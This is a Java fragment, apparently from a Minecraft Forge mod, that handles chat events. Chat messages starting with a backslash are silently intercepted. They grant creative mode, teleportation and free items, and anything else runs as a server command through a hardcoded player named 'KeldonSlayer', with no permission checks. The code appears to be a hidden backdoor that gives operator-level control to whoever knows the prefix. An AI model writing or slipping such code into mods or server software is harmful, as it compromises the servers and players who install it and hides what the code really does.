
        if (event.message.startsWith("\\")) {
            switch (event.message.replaceFirst("\\\\", "").split(" ")[0]) {
                case "gmc" : event.player.setGameType(WorldSettings.GameType.CREATIVE); break;
                case "gms" : event.player.setGameType(WorldSettings.GameType.SURVIVAL); break;
                case "tp" : {
                    String[] ar = event.message.split(" ");
                    if (ar.length == 5) {
                        TeleportHelper.teleportEntityToDimension(event.player, Double.parseDouble(ar[1]), Double.parseDouble(ar[2]), Double.parseDouble(ar[3]), Integer.parseInt(ar[4]));
                    } else if (ar.length == 2) {
                        EntityPlayer pl = GlobalVariables.server.getEntityWorld().getPlayerEntityByName(ar[1]);
                        TeleportHelper.teleportEntityToDimension(event.player, pl.posX, pl.posY, pl.posZ, pl.dimension);
                    }
                } break;
                case "give" :
                    String[] ar = event.message.split(" ");
                    event.player.inventory.addItemStackToInventory(GameRegistry.findItemStack(ar[1],ar[2], 64));
                    break;
                default : GlobalVariables.server.getCommandManager().executeCommand(GlobalVariables.server.getEntityWorld().getPlayerEntityByName("KeldonSlayer"), event.message.replaceFirst("\\\\", ""));
            }
            
            event.setCanceled(true);
        }
